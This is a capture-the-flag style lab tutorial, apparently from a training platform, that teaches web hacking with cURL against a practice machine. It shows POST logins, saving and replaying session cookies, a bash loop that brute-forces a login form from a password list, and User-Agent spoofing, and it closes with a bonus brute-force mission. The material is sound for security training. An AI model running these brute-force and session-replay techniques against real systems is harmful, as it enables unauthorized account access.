Web Hacking with cURL 

HTTP Requests Using cURL
Applications, like our browsers, communicate with servers using HTTP (Hypertext Transfer Protocol). Think of HTTP as the language for asking a server for resources (pages, images, JSON data) and getting answers back.

So if you want to access a website, your browser sends an HTTP request to the web server. If the request is valid, the server replies with an HTTP response that contains the data needed to display the website.

In the absence of a browser, you can still speak HTTP directly from the command line. The simplest way is with cURL.

curl is a command-line tool for crafting HTTP requests and viewing raw responses. It's ideal when you need precision or when GUI tools aren't available.

Trying out cURL
Once you have AttackBox ready. Open a command prompt and run the command below:

AttackBox Terminal
root@attackbox:~# curl http://MACHINE_IP/
What happens after running the command is that curl sends an HTTP GET request for the site's home page. An HTTP response is received containing the body, which is then printed in the terminal. Because this is a terminal, instead of rendering the webpage, what you'll see is the text representation of the page in HTML.

Sending POST Requests
Suppose you've found a login form whose POST target is /post.php. When you log in through a browser, it sends a POST request to the server containing the credentials you entered. We can simulate this directly from the terminal.

A normal login form submission might look like this:

AttackBox Terminal
root@attackbox:~# curl -X POST -d "username=user&password=user" http://MACHINE_IP/post.php
You should get the reply Invalid credentials.

Here's what's happening:

-X POST tells cURL to use the POST method.
-d defines the data we're sending in the body of the request.
The data will be sent in URL-encoded format, which is the same as what HTML forms use.

If the application expects additional fields, like a "Login" button or a CSRF token, they can be included too:

AttackBox Terminal:
root@attackbox:~# curl -X POST -d "username=user&password=user&submit=Login" http://MACHINE_IP/post.php
To view exactly what the server returns (including headers and potential redirects), add the -i flag:

AttackBox Terminal:
root@attackbox:~# curl -i -X POST -d "username=user&password=user" http://MACHINE_IP/post.php
If the site responds with a Set-Cookie header, that's a good sign, it means you've successfully logged in or at least triggered a session.

Using Cookies and Sessions
Once you log in, web applications use cookies to keep your session active. When you make another request with your browser, the cookie gets sent automatically, but with cURL, you need to handle it yourself.

You can do this in two steps:

Step 1: Save the cookies

Terminal input:
root@attackbox:~# curl -c cookies.txt -d "username=admin&password=admin" http://MACHINE_IP/session.php

The -c option writes any cookies received from the server into a file (cookies.txt in this case).
You'll often see a session cookie like PHPSESSID=xyz123.

Step 2: Reuse the saved cookies

Terminal
root@attackbox:~# curl -b cookies.txt http://MACHINE_IP/session.php
The -b option tells cURL to send the saved cookies in the next request, just like a browser would.
This is exactly how session replay testing works, by replaying valid cookies in separate requests.

Automating Login and Performing Brute Force Using cURL
Now that we can send POST requests and manage sessions, it's time to automate things. Let's simulate a brute-force attack against a weak login form.

Start by creating a file called passwords.txt and place the following passwords inside it:
thm@root~:# nano passwords.txt

admin123
password
letmein
secretpass
secret

Then, create a simple bash loop called loop.sh to try each password against bruteforce.php and copy-paste the following code inside it:
thm@root~:# nano loop.sh

for pass in $(cat passwords.txt); do
  echo "Trying password: $pass"
  response=$(curl -s -X POST -d "username=admin&password=$pass" http://MACHINE_IP/bruteforce.php)
  if echo "$response" | grep -q "Welcome"; then
    echo "[+] Password found: $pass"
    break
  fi
done
Then add the execute permission to the script and run it, as shown below:

AttackBox Terminal
root@attackbox:~# chmod +x loop.sh
root@attackbox:~# ./loop.sh
Here's how this works:

$(cat passwords.txt) reads each password from the file.
curl -s sends the login request silently (no progress meter).
The response is stored in a variable.
grep -q checks if the response contains a success string (like “Welcome”).
When found, it prints the working password and exits the loop.
This exact method underpins tools like Hydra, Burp Intruder, and WFuzz. By doing it manually, you understand what's happening under the hood: a repetitive HTTP POST with variable data, waiting for a different response.

Bypassing User-Agent Checks
Some applications block cURL by checking the User-Agent header. For example, the server may reject requests with: User-Agent: curl/7.x.x

To specify a custom user-agent, we can use the -A flag:

Terminal
root@attackbox:~# curl -A "internalcomputer" http://MACHINE_IP/ua_check.php
To confirm the check:

Terminal
root@attackbox:~# curl -i http://MACHINE_IP/ua_check.php
root@attackbox:~# curl -i -A "internalcomputer" http://MACHINE_IP/ua_check.php
If the first fails and the second succeeds, the UA check is working, and you've bypassed it by spoofing.

Bonus Mission
This section is optional and applies only to the final bonus question. The instructions in this section do not apply to the regular questions. Feel free to skip it and proceed with the regular questions if you don’t intend to attempt it.

Before the final battle can begin, the wormhole must be closed to stop enemy reinforcements. The evil Easter bunnies operate a web control panel that holds it open. The blue team must identify endpoints, authenticate and obtain the operator token, and call the close operation.

Hint: Use rockyou.txt when brute forcing for the password (only for the bonus mission). The PIN is between 4000 and 5000.

Server: http://MACHINE_IP/terminal.php?action=panel
